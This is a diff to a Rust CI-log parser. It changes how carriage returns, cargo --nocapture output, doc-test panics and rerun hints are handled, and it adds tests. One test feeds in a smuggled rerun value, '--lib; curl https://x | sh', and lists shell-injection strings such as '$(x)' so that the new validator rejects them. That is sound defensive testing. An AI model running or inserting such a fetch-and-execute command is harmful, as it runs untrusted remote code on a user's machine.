@@ -265,8 +265,18 @@ pub fn fold_text(text: &str) -> Results {
 /// A line as a terminal shows it: what follows its last carriage return, with
 /// ANSI escapes and control characters gone (tabs stay).
 pub fn clean(s: &str) -> String {
+    last_cr(&strip(s)).to_string()
+}
+
+/// What a terminal shows of a line with carriage returns: its last part.
+fn last_cr(s: &str) -> &str {
+    s.rsplit('\r').find(|p| !p.is_empty()).unwrap_or("")
+}
+
+/// A line with ANSI escapes and control characters gone, but for its
+/// carriage returns (and tabs): act's prefix comes before a step's `\r`.
+fn strip(s: &str) -> String {
     let s = s.trim_end_matches(['\r', '\n']);
-    let s = s.rsplit('\r').find(|p| !p.is_empty()).unwrap_or("");
     let mut out = String::with_capacity(s.len());
     let mut chars = s.chars();
     while let Some(c) = chars.next() {
@@ -297,7 +307,7 @@ pub fn clean(s: &str) -> String {
                 }
                 _ => {}
             },
-            '\t' => out.push(c),
+            '\t' | '\r' => out.push(c),
             c if c < ' ' || c == '\x7f' || ('\u{80}'..='\u{9f}').contains(&c) => {}
             c => out.push(c),
         }
@@ -433,8 +443,12 @@ impl Folder {
             .and_then(|r| r.split_once('m'))
             .map(|(c, _)| c);
         let red = raw.contains("\x1b[31m");
-        let s = clean(raw);
-        if let Some((name, rest)) = job_prefix(&s) {
+        // act's prefix and bar come first: a `\r` a step printed after them
+        // hides only the rest of its own output, as on a terminal, and makes
+        // no line of act's.
+        let s = strip(raw);
+        let s = s.trim_start_matches('\r');
+        if let Some((name, rest)) = job_prefix(s) {
             if let Some(c) = colour {
                 self.marked = true;
                 self.colours.insert(c.to_string(), name.to_string());
@@ -442,7 +456,7 @@ impl Folder {
             return self.text_job(name, rest);
         }
         if let Some(o) = s.strip_prefix('|') {
-            let o = o.strip_prefix(' ').unwrap_or(o);
+            let o = last_cr(o.strip_prefix(' ').unwrap_or(o));
             let job = colour
                 .and_then(|c| self.colours.get(c))
                 .and_then(|name| self.keys.get(name))
@@ -454,7 +468,8 @@ impl Folder {
             }
             return;
         }
-        if let Some((error, msg)) = logrus(&s) {
+        let s = last_cr(s);
+        if let Some((error, msg)) = logrus(s) {
             if error {
                 self.outside(&msg, true, false);
             }
@@ -466,10 +481,10 @@ impl Folder {
             self.marked || (self.pending.is_empty() && self.open.values().all(Vec::is_empty));
         let error = s.starts_with("Error: ") || red;
         if colour.is_some() || s.starts_with("act: ") || (quiet && error) {
-            return self.outside(&s, error, red);
+            return self.outside(s, error, red);
         }
         if !self.marked {
-            self.orphan(&s);
+            self.orphan(s);
         }
     }
 
@@ -484,13 +499,13 @@ impl Folder {
             }
         };
         self.last = Some(key.clone());
-        let body = rest.trim();
-        if body.starts_with("[DEBUG]") {
-            return;
-        }
         if let Some(o) = rest.trim_start().strip_prefix('|') {
             self.marked = true;
-            return self.output(&key, o.strip_prefix(' ').unwrap_or(o));
+            return self.output(&key, last_cr(o.strip_prefix(' ').unwrap_or(o)));
+        }
+        let body = last_cr(rest).trim();
+        if body.starts_with("[DEBUG]") {
+            return;
         }
         let mut l = JobLine {
             key: key.clone(),
@@ -711,10 +726,14 @@ impl Folder {
             })
             .collect();
         if let Some(o) = out.remove(&loose_key()).filter(Output::found) {
-            let step = o.step(&actlog::Step::default(), true);
+            let mut step = o.step(&actlog::Step::default(), true);
             let failed = step.failed_cases().next().is_some()
                 || step.tests.iter().any(|c| c.failed > 0)
                 || !step.reruns.is_empty();
+            // What failed there failed in it: the brief and the prompt say what.
+            if failed {
+                step.result = Some("failure".into());
+            }
             jobs.push(Job {
                 result: if failed { "failure" } else { "unknown" }.into(),
                 steps: vec![step],
@@ -972,7 +991,11 @@ fn network(line: &str) -> Option<String> {
             let n = words
                 .next()?
                 .trim_matches(|c: char| !(c.is_ascii_alphanumeric() || "-_:".contains(c)));
-            return (!n.is_empty()).then(|| n.to_string());
+            // A network's name (`host`, `bridge`, `container:ID`), nothing else.
+            let name = n
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || "-_.:".contains(c));
+            return (!n.is_empty() && name).then(|| n.to_string());
         }
     }
     None
@@ -1052,6 +1075,11 @@ struct Output {
     panic: Option<Panic>,
     /// Panics of tests not yet seen failing (`--nocapture` prints them first).
     panics: Vec<Panic>,
+    /// The test libtest said it runs (`test NAME ... `), its result to come on
+    /// a line of its own: one test at a time, with `--nocapture`.
+    running: Option<String>,
+    /// The failed test whose output libtest shows now (`---- NAME stdout ----`).
+    section: Option<String>,
 }
 
 impl Output {
@@ -1067,11 +1095,13 @@ impl Output {
         self.keep(line.to_string());
         if let Some(mut p) = self.panic.take() {
             let t = line.trim();
+            // Only a process's first panic has the note after it: with
+            // --nocapture, the next line libtest prints ends the others.
             let done = t.is_empty()
                 || t.starts_with("note: ")
                 || t.starts_with("stack backtrace:")
-                || t.starts_with("thread '")
-                || p.lines.len() == PANIC_LINES;
+                || p.lines.len() == PANIC_LINES
+                || self.said(line);
             if !done {
                 p.lines.push(t.to_string());
                 self.panic = Some(p);
@@ -1083,36 +1113,39 @@ impl Output {
         // test's output, and counts that test itself.
         let t = line.trim_start();
         if let Some(rest) = line.strip_prefix("test result: ") {
+            (self.running, self.section) = (None, None);
             if let Some(c) = libtest_counts(rest) {
                 self.cargo
                     .get_or_insert_with(|| Count::new("cargo"))
                     .add(&c);
             }
         } else if let Some(rest) = line.strip_prefix("test ") {
-            if let Some((name, result)) = libtest_case(rest) {
-                self.case(name, result, self.binary.clone());
+            self.running = None;
+            match libtest_case(rest) {
+                Some((name, result)) => self.case(name, result, self.binary.clone()),
+                None => self.running = libtest_started(rest).map(String::from),
             }
-        } else if let Some(rest) = line.strip_prefix("error: test failed, to rerun pass `") {
-            if let Some((target, _)) = rest.split_once('`') {
-                if !self.reruns.iter().any(|r| r == target) {
-                    self.reruns.push(target.to_string());
-                }
+        } else if let Some(result) = self.running.as_ref().and_then(|_| bare_result(line)) {
+            if let Some(name) = self.running.take() {
+                self.case(&name, result, self.binary.clone());
+            }
+        } else if let Some(target) = rerun_hint(line) {
+            if cargo_target(target) && !self.reruns.iter().any(|r| r == target) {
+                self.reruns.push(target.to_string());
             }
         } else if line.starts_with("error: ")
             && (line.contains(" target failed") || line.contains(" targets failed"))
         {
             self.all_ran = true;
-        } else if let Some(rest) = t.strip_prefix("Running ") {
-            // `Running unittests src/lib.rs (target/debug/deps/demo-7f33b6e5)`
-            if let Some((binary, _)) = rest
-                .trim_end()
-                .strip_suffix(')')
-                .and_then(|r| r.rsplit_once(" ("))
-            {
-                self.binary = Some(binary.to_string());
-            }
+        } else if let Some(binary) = running_binary(t) {
+            (self.binary, self.running, self.section) = (Some(binary.to_string()), None, None);
         } else if t.starts_with("Doc-tests ") {
+            (self.running, self.section) = (None, None);
             self.binary = Some(t.trim_end().to_string());
+        } else if let Some(name) = section(t) {
+            self.section = Some(name.to_string());
+        } else if line.trim_end() == "failures:" {
+            self.section = None;
         } else if t.starts_with("thread '") {
             self.panic_line(t);
         } else if let Some(c) = nextest_summary(t) {
@@ -1162,15 +1195,29 @@ impl Output {
     }
 
     /// A panic goes with its test, the latest one of that name that failed.
-    fn panicked(&mut self, p: Panic) {
-        let test = self
+    /// Another thread's (a doc test's `main`, a thread the test started) goes
+    /// with the test whose output libtest shows, or the one that runs now.
+    fn panicked(&mut self, mut p: Panic) {
+        let open = |c: &Case, name: &str| c.name == name && c.result == "failed" && c.at.is_none();
+        let i = self
             .cases
-            .iter_mut()
-            .rev()
-            .find(|c| c.name == p.thread && c.result == "failed" && c.at.is_none());
-        match test {
-            Some(c) => (c.at, c.message) = (Some(p.at.clone()), p.message()),
-            None => self.panics.push(p),
+            .iter()
+            .rposition(|c| open(c, &p.thread))
+            .or_else(|| {
+                let s = self.section.as_deref()?;
+                self.cases.iter().rposition(|c| open(c, s))
+            });
+        match i {
+            Some(i) => {
+                let c = &mut self.cases[i];
+                (c.at, c.message) = (Some(p.at.clone()), p.message());
+            }
+            None => {
+                if let Some(name) = &self.running {
+                    p.thread.clone_from(name);
+                }
+                self.panics.push(p)
+            }
         }
     }
 
@@ -1190,11 +1237,30 @@ impl Output {
         self.cases.push(c);
     }
 
+    /// A line libtest, cargo or nextest prints, which no panic's message has.
+    fn said(&self, line: &str) -> bool {
+        let t = line.trim_start();
+        line.starts_with("test result: ")
+            || line
+                .strip_prefix("test ")
+                .is_some_and(|r| libtest_case(r).is_some() || libtest_started(r).is_some())
+            || (self.running.is_some() && bare_result(line).is_some())
+            || rerun_hint(line).is_some()
+            || line.trim_end() == "failures:"
+            || section(t).is_some()
+            || t.starts_with("thread '")
+            || running_binary(t).is_some()
+            || t.starts_with("Doc-tests ")
+            || nextest_summary(t).is_some()
+            || (self.in_nextest && nextest_case(t).is_some())
+    }
+
     /// The step's output has ended.
     fn close(&mut self) {
         if let Some(p) = self.panic.take() {
             self.panicked(p);
         }
+        self.running = None;
     }
 
     /// Something worth keeping outside any step.
@@ -1266,6 +1332,78 @@ fn libtest_case(rest: &str) -> Option<(&str, &'static str)> {
         _ => return None,
     };
     Some((name, result))
+}
+
+/// `NAME ... ` with no result yet, or the test's own output after it: one test
+/// at a time, with `--nocapture`, libtest prints the result on a line of its
+/// own when the test ends.
+fn libtest_started(rest: &str) -> Option<&str> {
+    let name = match rest.split_once(" ... ") {
+        Some((name, _)) => name,
+        None => rest.trim_end().strip_suffix(" ...")?,
+    };
+    (!name.is_empty()).then_some(name)
+}
+
+/// That line: `ok` or `FAILED`.
+fn bare_result(line: &str) -> Option<&'static str> {
+    match line.trim_end() {
+        "ok" => Some("passed"),
+        "FAILED" => Some("failed"),
+        _ => None,
+    }
+}
+
+/// What cargo says to pass to rerun what failed: ``error: test failed, to
+/// rerun pass `-p x --test y` `` (`doctest failed` for doc tests).
+fn rerun_hint(line: &str) -> Option<&str> {
+    let rest = line
+        .strip_prefix("error: test failed, to rerun pass `")
+        .or_else(|| line.strip_prefix("error: doctest failed, to rerun pass `"))?;
+    rest.split_once('`').map(|(target, _)| target)
+}
+
+/// A target as cargo names one there: `[-p PACKAGE] --lib|--doc`, or with
+/// `--bin|--test|--example|--bench NAME`. Anything else is not cargo's, and no
+/// command to hand on.
+fn cargo_target(t: &str) -> bool {
+    let name = |s: &str| {
+        !s.is_empty()
+            && s.len() <= 100
+            && !s.starts_with('-')
+            && s.bytes()
+                .all(|b| b.is_ascii_alphanumeric() || b"_.-".contains(&b))
+    };
+    let mut words = t.split(' ');
+    let mut kind = words.next();
+    if kind == Some("-p") {
+        if !words.next().is_some_and(name) {
+            return false;
+        }
+        kind = words.next();
+    }
+    match (kind, words.next(), words.next()) {
+        (Some("--lib" | "--doc"), None, None) => true,
+        (Some("--bin" | "--test" | "--example" | "--bench"), Some(n), None) => name(n),
+        _ => false,
+    }
+}
+
+/// `Running unittests src/lib.rs (target/debug/deps/demo-7f33b6e5)`: the binary.
+fn running_binary(t: &str) -> Option<&str> {
+    let (binary, _) = t
+        .strip_prefix("Running ")?
+        .trim_end()
+        .strip_suffix(')')?
+        .rsplit_once(" (")?;
+    Some(binary)
+}
+
+/// `---- NAME stdout ----`: a failed test's output follows.
+fn section(t: &str) -> Option<&str> {
+    t.trim_end()
+        .strip_prefix("---- ")?
+        .strip_suffix(" stdout ----")
 }
 
 /// nextest's last word: `Summary [   0.015s] 5 tests run: 4 passed, 1 failed,
@@ -1576,6 +1714,11 @@ mod tests {
     const CARGO: &str = include_str!("../tests/fixtures/results/cargo-test.txt");
     const CARGO_ALL: &str = include_str!("../tests/fixtures/results/cargo-test-no-fail-fast.txt");
     const NEXTEST: &str = include_str!("../tests/fixtures/results/nextest.txt");
+    /// cargo 1.94's `cargo test -- --nocapture`, the tests side by side, then
+    /// one at a time (`--test-threads=1`); and a doc test that fails.
+    const NOCAPTURE: &str = include_str!("../tests/fixtures/results/cargo-nocapture.txt");
+    const SERIAL: &str = include_str!("../tests/fixtures/results/cargo-nocapture-serial.txt");
+    const DOCTEST: &str = include_str!("../tests/fixtures/results/cargo-doctest.txt");
 
     const KEEP_BUILDS: &str =
         "tjrb-xyz/bana/actions/keep-builds@a4b6f87212d190304c530041b9bbd5fed72f0dd3";
@@ -1854,6 +1997,11 @@ mod tests {
         let s = &r.jobs[0].steps[0];
         assert_eq!(s.tests, [count("cargo", 1, 1, 1, true)]);
         assert_eq!(s.reruns, ["--lib"]);
+        assert_eq!(
+            failures(&r),
+            [("", "", Owner::Project)],
+            "its failing tests failed in it"
+        );
         let bad: Vec<&Case> = s.failed_cases().collect();
         assert_eq!(
             (bad[0].at.as_deref(), bad[0].message.as_deref()),
@@ -2146,6 +2294,138 @@ test result: FAILED. 0 passed; 2 failed; 1 ignored; 0 measured; 0 filtered out; 
                     Some("assertion `left == right` failed\nleft: 1\nright: 2")
                 ),
                 ("a::three", "skipped", None, None),
+            ]
+        );
+    }
+
+    /// Each failed test: its name, where it panicked, and its message.
+    fn failed(s: &Step) -> Vec<(&str, Option<&str>, Option<&str>)> {
+        s.failed_cases()
+            .map(|c| (c.name.as_str(), c.at.as_deref(), c.message.as_deref()))
+            .collect()
+    }
+
+    #[test]
+    fn nocapture_and_doc_tests_as_cargo_prints_them() {
+        // Only the first panic has a note after it: the next one's message
+        // ends at its test's line. One test at a time, the test's line comes
+        // first, its output (or a thread's panic) after it, then FAILED alone.
+        let wrapped = |log: &str| {
+            let lines: Vec<String> = log.lines().map(|l| format!("[ci/rust]   | {l}")).collect();
+            format!(
+                "[ci/rust] ⭐ Run Main cargo test\n{}\n[ci/rust]   ❌  Failure - Main cargo test [1s]\n[ci/rust] 🏁  Job failed\n",
+                lines.join("\n")
+            )
+        };
+        let math = "assertion `left == right` failed: math\nleft: 2\nright: 3";
+        for (log, want, passed) in [
+            (
+                NOCAPTURE,
+                vec![
+                    ("tests::a", Some("src/lib.rs:15:9"), Some("boom")),
+                    ("tests::b", Some("src/lib.rs:20:9"), Some(math)),
+                ],
+                "tests::c",
+            ),
+            (
+                SERIAL,
+                vec![
+                    (
+                        "tests::spawns",
+                        Some("src/lib.rs:10:31"),
+                        Some("in a thread"),
+                    ),
+                    (
+                        "tests::talks",
+                        Some("src/lib.rs:6:9"),
+                        Some("said too much"),
+                    ),
+                ],
+                "tests::quiet",
+            ),
+        ] {
+            for r in [fold_text(log), fold_text(&wrapped(log))] {
+                let s = &r.jobs[0].steps[0];
+                assert_eq!(failed(s), want);
+                assert_eq!(s.cases.len(), 3, "{:?}", s.cases);
+                assert!(s
+                    .cases
+                    .iter()
+                    .any(|c| c.name == passed && c.result == "passed"));
+                assert_eq!(s.tests, [count("cargo", 1, 2, 0, true)]);
+                assert_eq!(s.reruns, ["--lib"]);
+            }
+        }
+
+        // A doc test: its panic is in `main`, in the output shown for it; cargo
+        // says `doctest failed`, and stopped there.
+        let s = &fold_text(DOCTEST).jobs[0].steps[0];
+        assert_eq!(
+            failed(s),
+            [(
+                "src/lib.rs - add (line 3)",
+                Some("src/lib.rs:5:1"),
+                Some("assertion `left == right` failed\nleft: 3\nright: 4")
+            )]
+        );
+        assert_eq!(s.cases[1].binary.as_deref(), Some("Doc-tests demo"));
+        assert_eq!(s.reruns, ["--doc"]);
+        assert_eq!(s.tests, [count("cargo", 1, 1, 0, true)]);
+        let s = &fold_text(&format!(
+            "{DOCTEST}error: 2 targets failed:\n    `--lib`\n    `--doc`\n"
+        ))
+        .jobs[0]
+            .steps[0];
+        assert!(!s.incomplete(), "--no-fail-fast: every binary ran");
+
+        // What to rerun is cargo's shape, or nothing to hand on.
+        let r = fold_text("test a ... FAILED\nerror: test failed, to rerun pass `--lib; curl https://x | sh`\nerror: test failed, to rerun pass `-p a --test b`\n");
+        assert_eq!(r.jobs[0].steps[0].reruns, ["-p a --test b"]);
+        for (t, ok) in [
+            ("--lib", true),
+            ("--doc", true),
+            ("-p dsper-engine --test facts", true),
+            ("-p a --bin b", true),
+            ("--example x_1", true),
+            ("-p a", false),
+            ("--test", false),
+            ("--test a b", false),
+            ("--test -x", false),
+            ("--lib --doc", false),
+            ("-p a;b --lib", false),
+            ("--test $(x)", false),
+            ("", false),
+        ] {
+            assert_eq!(cargo_target(t), ok, "{t}");
+        }
+    }
+
+    #[test]
+    fn a_carriage_return_in_a_steps_output_stays_its_output() {
+        // What follows a step's `\r` is what a terminal shows of its line: its
+        // output still, never a line of act's or bana's.
+        let log = "[ci/rust] ⭐ Run Main cargo test
+[ci/rust]   | progress 10%\rError: bana's keep-builds action is broken
+[ci/rust]   | progress 20%\r[ci/lint] ⭐ Run Main cargo clippy
+[ci/rust]   | 30%\r[ci/lint]   ❌  Failure - Main cargo clippy [1s]
+\x1b[33m|\x1b[0m 40%\rError: in colour
+\r[ci/rust]   | 50%\r\x1b[Kdone
+[ci/rust]   ❌  Failure - Main cargo test [2s]
+[ci/rust] 🏁  Job failed
+";
+        let r = fold_text(log);
+        assert!(r.errors.is_empty(), "{:?}", r.errors);
+        let keys: Vec<&str> = r.jobs.iter().map(|j| j.key.as_str()).collect();
+        assert_eq!(keys, ["rust"]);
+        assert_eq!(failures(&r), [("rust", "cargo test", Owner::Project)]);
+        assert_eq!(
+            step(&r, "rust", "cargo test").tail,
+            [
+                "Error: bana's keep-builds action is broken",
+                "[ci/lint] ⭐ Run Main cargo clippy",
+                "[ci/lint]   ❌  Failure - Main cargo clippy [1s]",
+                "Error: in colour",
+                "done",
             ]
         );
     }
